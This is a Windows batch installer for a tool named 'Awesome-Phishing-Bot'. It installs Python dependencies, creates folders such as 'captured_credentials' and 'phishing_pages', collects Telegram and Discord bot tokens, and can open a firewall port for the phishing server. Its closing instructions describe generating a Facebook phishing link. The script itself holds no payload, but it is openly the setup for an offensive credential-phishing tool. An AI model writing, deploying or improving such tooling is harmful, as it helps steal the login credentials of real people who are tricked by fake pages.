@echo off
:: 🌿 Awesome-Phishing-Bot Installation Script (Windows)
:: Version: 9.5.1

setlocal enabledelayedexpansion

title Awesome-Phishing-Bot Installer v9.5.1
color 0A

echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║                    🌿 AWESOME-PHISHING-BOT v9.5.1                          ║
echo ║                         Windows Installation                                  ║
echo ╚══════════════════════════════════════════════════════════════════════════════╝
echo.

:: Check Python installation
echo [*] Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found! Please install Python 3.7+ from python.org
    echo [*] Download from: https://www.python.org/downloads/
    pause
    exit /b 1
)
for /f "tokens=2" %%a in ('python --version 2^>^&1') do set PYTHON_VER=%%a
echo [✓] Python %PYTHON_VER% found
echo.

:: Check pip
echo [*] Checking pip...
pip --version >nul 2>&1
if errorlevel 1 (
    echo [!] pip not found! Installing...
    python -m ensurepip --upgrade
)
echo [✓] pip available
echo.

:: Create directories
echo [*] Creating directories...
mkdir .awesome_bot 2>nul
mkdir .awesome_bot\phishing_pages 2>nul
mkdir .awesome_bot\phishing_templates 2>nul
mkdir .awesome_bot\phishing_logs 2>nul
mkdir .awesome_bot\captured_credentials 2>nul
mkdir awesome_reports 2>nul
mkdir awesome_reports\graphics 2>nul
mkdir .awesome_bot\ssh_keys 2>nul
mkdir .awesome_bot\whatsapp_session 2>nul
echo [✓] Directories created
echo.

:: Upgrade pip
echo [*] Upgrading pip...
python -m pip install --upgrade pip
echo.

:: Install Python packages
echo [*] Installing Python packages...
echo [ ] This may take a few minutes...

pip install requests psutil matplotlib seaborn numpy reportlab ^
    Pillow qrcode pyshorteners discord.py telethon slack-sdk ^
    paramiko beautifulsoup4 selenium shodan flask cryptography ^
    python-dotenv tqdm colorama

if errorlevel 1 (
    echo [!] Some packages failed to install
    echo [*] Trying alternative installation...
    pip install --user requests psutil matplotlib seaborn numpy reportlab Pillow qrcode pyshorteners
) else (
    echo [✓] Python packages installed
)
echo.

:: Create default config
echo [*] Creating default configuration...
if not exist ".awesome_bot\config.json" (
    (
        echo {
        echo     "version": "9.5.1",
        echo     "first_run": true,
        echo     "auto_start_phishing": false,
        echo     "default_port": 8080,
        echo     "log_level": "INFO",
        echo     "max_credentials_storage": 10000,
        echo     "auto_report": true,
        echo     "report_interval_hours": 24
        echo }
    ) > .awesome_bot\config.json
    echo [✓] Config created
) else (
    echo [✓] Config already exists
)
echo.

:: Create launcher batch file
echo [*] Creating launcher...
(
    echo @echo off
    echo title Awesome-Phishing-Bot v9.5.1
    echo color 0A
    echo python awesome_phishing_bot.py %%*
    echo pause
) > run_awesome_bot.bat
echo [✓] Launcher created: run_awesome_bot.bat
echo.

:: Create PowerShell launcher (better terminal)
(
    echo Write-Host "🌿 AWESOME-PHISHING-BOT v9.5.1" -ForegroundColor Green
    echo Write-Host "Starting bot..." -ForegroundColor Yellow
    echo python awesome_phishing_bot.py
    echo Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
    echo $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
) > run_awesome_bot.ps1
echo [✓] PowerShell launcher created: run_awesome_bot.ps1
echo.

:: Optional: Install Chrome for Selenium
echo [*] Check for Chrome browser...
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" >nul 2>&1
if errorlevel 1 (
    echo [!] Chrome not found. For Selenium support, install Chrome from:
    echo     https://www.google.com/chrome/
) else (
    echo [✓] Chrome detected
)
echo.

:: Optional: Setup virtual environment
set /p create_venv="Create Python virtual environment? (y/n): "
if /i "%create_venv%"=="y" (
    echo [*] Creating virtual environment...
    python -m venv awesome_bot_venv
    echo [✓] Virtual environment created
    echo [*] To activate: awesome_bot_venv\Scripts\activate
)
echo.

:: Optional: Setup bot tokens
set /p setup_tokens="Setup bot tokens now? (y/n): "
if /i "%setup_tokens%"=="y" (
    echo.
    echo 🤖 Bot Token Setup
    echo.
    
    set /p telegram_token="Telegram Bot Token (from @BotFather): "
    if not "!telegram_token!"=="" (
        (
            echo {
            echo     "enabled": true,
            echo     "bot_token": "!telegram_token!",
            echo     "api_id": "",
            echo     "api_hash": ""
            echo }
        ) > .awesome_bot\telegram_config.json
        echo [✓] Telegram configured
    )
    
    set /p discord_token="Discord Bot Token: "
    if not "!discord_token!"=="" (
        (
            echo {
            echo     "enabled": true,
            echo     "token": "!discord_token!",
            echo     "prefix": "!"
            echo }
        ) > .awesome_bot\discord_config.json
        echo [✓] Discord configured
    )
)
echo.

:: Firewall rule (optional)
set /p add_firewall="Add Windows Firewall rule for port 8080? (y/n): "
if /i "%add_firewall%"=="y" (
    echo [*] Adding firewall rule...
    netsh advfirewall firewall add rule name="Awesome Phishing Bot" dir=in action=allow protocol=tcp localport=8080 >nul 2>&1
    echo [✓] Firewall rule added
)
echo.

:: Installation complete
echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║                         ✅ INSTALLATION COMPLETE!                            ║
echo ╚══════════════════════════════════════════════════════════════════════════════╝
echo.
echo 📝 Next steps:
echo   1. Run the bot: double-click run_awesome_bot.bat
echo   2. Or run: python awesome_phishing_bot.py
echo   3. Type help for available commands
echo   4. Type phish facebook to generate a phishing link
echo.
echo 💡 Pro tips:
echo   • Edit .awesome_bot\config.json to change settings
echo   • Check .awesome_bot\phishing_logs\ for logs
echo   • Reports are saved in awesome_reports\
echo.
echo Press any key to exit...
pause >nul